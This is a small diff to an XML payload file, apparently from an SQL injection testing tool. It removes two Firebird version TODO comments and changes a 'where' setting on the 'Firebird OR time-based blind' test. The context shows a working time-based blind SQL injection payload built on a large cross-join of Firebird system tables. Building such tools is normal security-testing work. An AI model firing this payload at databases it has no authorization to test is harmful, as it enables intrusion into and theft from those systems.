@@ -1472,7 +1472,6 @@ Formats:
     </test>
 
     <test>
-        <!-- TODO: works only on Firebird >= 3.0? -->
         <title>Firebird AND time-based blind</title>
         <stype>5</stype>
         <level>4</level>
@@ -1560,13 +1559,12 @@ Formats:
     </test>
 
     <test>
-        <!-- TODO: works only on Firebird >= 3.0? -->
         <title>Firebird OR time-based blind</title>
         <stype>5</stype>
         <level>5</level>
         <risk>3</risk>
         <clause>1</clause>
-        <where>1</where>
+        <where>2</where>
         <epayload></epayload>
         <request>
             <payload>OR (SELECT COUNT(*) FROM RDB$DATABASE AS T1, RDB$FIELDS AS T2, RDB$FUNCTIONS AS T3, RDB$TYPES AS T4, RDB$FORMATS AS T5, RDB$COLLATIONS AS T6) > 0</payload>
